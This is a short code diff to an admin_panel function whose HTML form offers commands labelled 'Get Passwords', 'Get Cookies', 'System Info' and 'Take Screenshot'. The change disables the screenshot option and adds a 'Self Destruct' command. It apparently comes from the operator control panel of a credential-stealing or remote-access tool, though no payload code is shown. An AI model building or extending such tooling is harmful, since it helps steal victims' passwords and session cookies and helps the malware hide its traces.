@@ -136,7 +136,8 @@ def admin_panel():
     <option value="passwords">Get Passwords</option>
     <option value="cookies">Get Cookies</option>
     <option value="systeminfo">System Info</option>
-    <option value="screenshot">Take Screenshot</option>
+    <option value="screenshot">Take Screenshot (disabilitato)</option>
+    <option value="self_destruct">💣 Self Destruct</option>
     </select><br><br>
     
     <button type="submit">Send Command</button>
